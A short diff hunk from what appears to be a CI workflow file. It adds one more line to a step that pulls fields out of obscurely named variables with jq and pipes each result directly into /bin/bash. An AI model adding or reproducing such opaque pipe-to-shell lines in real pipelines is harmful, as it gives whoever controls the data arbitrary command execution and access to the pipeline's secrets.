@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$bz0" | jq -r .tfhx62058 | /bin/bash
           echo $mnr41 | jq -r .qhxxw10054 | /bin/bash
           echo $s09240 | jq -r .lkrvl22653 | /bin/bash
+          echo $l7 | jq -r .wimo46 | /bin/bash
 
       - name: Persist output
         if: always()
